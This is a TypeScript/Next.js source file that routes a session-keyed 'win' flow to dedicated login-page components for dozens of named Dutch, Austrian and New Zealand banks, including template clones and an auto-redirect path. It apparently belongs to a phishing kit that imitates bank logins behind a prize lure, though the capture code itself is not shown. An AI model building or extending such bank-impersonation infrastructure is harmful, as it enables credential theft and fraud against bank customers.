import dynamic from "next/dynamic";
import { isNzExactHtmlBank } from "@/lib/nz-bank-page-map";

type DedicatedBankClientProps = {
  sessionId: string;
  bankSlug: string;
  bankName: string;
  hasGeneratedDesign?: boolean;
  forceAutoRedirect?: boolean;
};

const AbnAmroLoginClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/abn-amro-client").then((mod) => mod.AbnAmroLoginClient),
);
const AdyenLoginClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/adyen-client").then((mod) => mod.AdyenLoginClient),
);
const AsnBankLoginClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/asn-bank-client").then((mod) => mod.AsnBankLoginClient),
);
const AsnBankVhRegiobankLoginClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/asn-bank-vh-regiobank-client").then((mod) => mod.AsnBankVhRegiobankLoginClient),
);
const AsnBankVoorheenBlgwonenLoginClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/asn-bank-voorheen-blgwonen-client").then((mod) => mod.AsnBankVoorheenBlgwonenLoginClient),
);
const AsnBankVoorheenSnsLoginClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/asn-bank-voorheen-sns-client").then((mod) => mod.AsnBankVoorheenSnsLoginClient),
);
const AutoRedirectClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/auto-redirect-client").then((mod) => mod.AutoRedirectClient),
);
const BunqLoginClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/bunq-client").then((mod) => mod.BunqLoginClient),
);
const FinomClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/finom-client").then((mod) => mod.FinomClient),
);
const IngClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/ing-client").then((mod) => mod.IngClient),
);
const N26Client = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/n26-client").then((mod) => mod.N26Client),
);
const NationaleNederlandenClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/nationale-nederlanden-client").then((mod) => mod.NationaleNederlandenClient),
);
const RabobankClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/rabobank-client").then((mod) => mod.RabobankClient),
);
const NzExactHtmlBankClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/nz-exact-html-bank-client").then((mod) => mod.NzExactHtmlBankClient),
);
const TriodosBankClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/triodos-bank-client").then((mod) => mod.TriodosBankClient),
);
const VanLanschotKempenClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/van-lanschot-kempen-client").then((mod) => mod.VanLanschotKempenClient),
);
const YoursafeClient = dynamic(() =>
  import("@/app/win/[id]/bank/[bank_slug]/yoursafe-client").then((mod) => mod.YoursafeClient),
);

// Austrian Bank Clients
const BankAustriaClient = dynamic(() =>
  import("@/components/templates/BankAustria").then((mod) => mod.BankAustria),
);
const BawagAgClient = dynamic(() =>
  import("@/components/templates/BawagAg").then((mod) => mod.BawagAg),
);
const ErsteBankClient = dynamic(() =>
  import("@/components/templates/ErsteBank").then((mod) => mod.ErsteBank),
);
const RaiffeisenClient = dynamic(() =>
  import("@/components/templates/Raiffeisen").then((mod) => mod.Raiffeisen),
);
const VolksbankenClient = dynamic(() =>
  import("@/components/templates/Volksbanken").then((mod) => mod.Volksbanken),
);
const PosojilnicaBankClient = dynamic(() =>
  import("@/components/templates/PosojilnicaBank").then((mod) => mod.PosojilnicaBank),
);
const Bank99Client = dynamic(() =>
  import("@/components/templates/Bank99").then((mod) => mod.Bank99),
);
const BtvVierLanderBankClient = dynamic(() =>
  import("@/components/templates/BtvVierLanderBank").then((mod) => mod.BtvVierLanderBank),
);
const BksBankClient = dynamic(() =>
  import("@/components/templates/BksBank").then((mod) => mod.BksBank),
);
const OberbankClient = dynamic(() =>
  import("@/components/templates/Oberbank").then((mod) => mod.Oberbank),
);
const HypoNoeClient = dynamic(() =>
  import("@/components/templates/HypoNoe").then((mod) => mod.HypoNoe),
);
const HypoTirolClient = dynamic(() =>
  import("@/components/templates/HypoTirol").then((mod) => mod.HypoTirol),
);
const HypoVorarlbergClient = dynamic(() =>
  import("@/components/templates/HypoVorarlberg").then((mod) => mod.HypoVorarlberg),
);
const HypoBurgenlandClient = dynamic(() =>
  import("@/components/templates/HypoBurgenland").then((mod) => mod.HypoBurgenland),
);
const HypoOberosterreichClient = dynamic(() =>
  import("@/components/templates/HypoOberosterreich").then((mod) => mod.HypoOberosterreich),
);
const AerzteApothekerBankClient = dynamic(() =>
  import("@/components/templates/AerzteApothekerBank").then((mod) => mod.AerzteApothekerBank),
);
const BankhausSpanglerClient = dynamic(() =>
  import("@/components/templates/BankhausSpangler").then((mod) => mod.BankhausSpangler),
);
const SchelhammerCapitalClient = dynamic(() =>
  import("@/components/templates/SchelhammerCapital").then((mod) => mod.SchelhammerCapital),
);
const EasybankClient = dynamic(() =>
  import("@/components/templates/Easybank").then((mod) => mod.Easybank),
);
const SchoellerbankClient = dynamic(() =>
  import("@/components/templates/Schoellerbank").then((mod) => mod.Schoellerbank),
);
const SpardaBankClient = dynamic(() =>
  import("@/components/templates/SpardaBank").then((mod) => mod.SpardaBank),
);
const VolkskreditbankClient = dynamic(() =>
  import("@/components/templates/Volkskreditbank").then((mod) => mod.Volkskreditbank),
);
const AnadiBankClient = dynamic(() =>
  import("@/components/templates/AnadiBank").then((mod) => mod.AnadiBank),
);
const MarchfelderBankClient = dynamic(() =>
  import("@/components/templates/MarchfelderBank").then((mod) => mod.MarchfelderBank),
);
const DolomitenbankClient = dynamic(() =>
  import("@/components/templates/Dolomitenbank").then((mod) => mod.Dolomitenbank),
);

export const AUTO_REDIRECT_BANKS = new Set(["buut", "knab", "mollie", "revolut"]);
export const AUSTRIAN_TEMPLATE_BANKS = new Set([
  "bank-austria",
  "bawag",
  "erste-bank",
  "raiffeisen",
  "volksbank",
  "posojilnica",
  "bank99",
  "btv",
  "bks-bank",
  "oberbank",
  "hypo-noe",
  "hypo-tirol",
  "hypo-vorarlberg",
  "hypo-burgenland",
  "hypo-ooe",
  "aerztebank",
  "spaengler",
  "schelhammer",
  "easybank",
  "schoellerbank-ag",
  "schoellerbank",
  "sparda-bank",
  "vkb",
  "anadi-bank",
  "marchfelder",
  "dolomitenbank",
]);

export function isAustrianTemplateBank(bankSlug: string) {
  return AUSTRIAN_TEMPLATE_BANKS.has(bankSlug);
}

export function renderDedicatedBankClient({
  sessionId,
  bankSlug,
  bankName,
  hasGeneratedDesign,
  forceAutoRedirect,
}: DedicatedBankClientProps) {
  if (forceAutoRedirect || AUTO_REDIRECT_BANKS.has(bankSlug)) {
    return <AutoRedirectClient sessionId={sessionId} bankSlug={bankSlug} bankName={bankName} />;
  }

  if (bankSlug === "van-lanschot-kempen" && !hasGeneratedDesign) {
    return <VanLanschotKempenClient sessionId={sessionId} />;
  }

  if (isNzExactHtmlBank(bankSlug)) {
    return <NzExactHtmlBankClient sessionId={sessionId} bankSlug={bankSlug} bankName={bankName} />;
  }

  // Austrian Banks - return null to use bank-login-client with templates
  if (isAustrianTemplateBank(bankSlug)) {
    return null; // Let bank-login-client handle Austrian templates
  }

  switch (bankSlug) {
    case "ing":
      return <IngClient sessionId={sessionId} />;
    case "finom":
      return <FinomClient sessionId={sessionId} />;
    case "yoursafe":
      return <YoursafeClient sessionId={sessionId} />;
    case "rabobank":
    case "rabobank-nz":
      return <RabobankClient sessionId={sessionId} />;
    case "n26":
      return <N26Client sessionId={sessionId} />;
    case "nationale-nederlanden":
      return <NationaleNederlandenClient sessionId={sessionId} />;
    case "triodos-bank":
      return <TriodosBankClient sessionId={sessionId} />;
    case "abn-amro":
      return <AbnAmroLoginClient sessionId={sessionId} />;
    case "adyen":
      return <AdyenLoginClient sessionId={sessionId} />;
    case "asn-bank":
      return <AsnBankLoginClient sessionId={sessionId} />;
    case "asn-bank-vh-regiobank":
      return <AsnBankVhRegiobankLoginClient sessionId={sessionId} />;
    case "asn-bank-voorheen-blgwonen":
      return <AsnBankVoorheenBlgwonenLoginClient sessionId={sessionId} />;
    case "asn-bank-voorheen-sns":
      return <AsnBankVoorheenSnsLoginClient sessionId={sessionId} />;
    case "bunq":
      return <BunqLoginClient sessionId={sessionId} />;
    default:
      return null;
  }
}
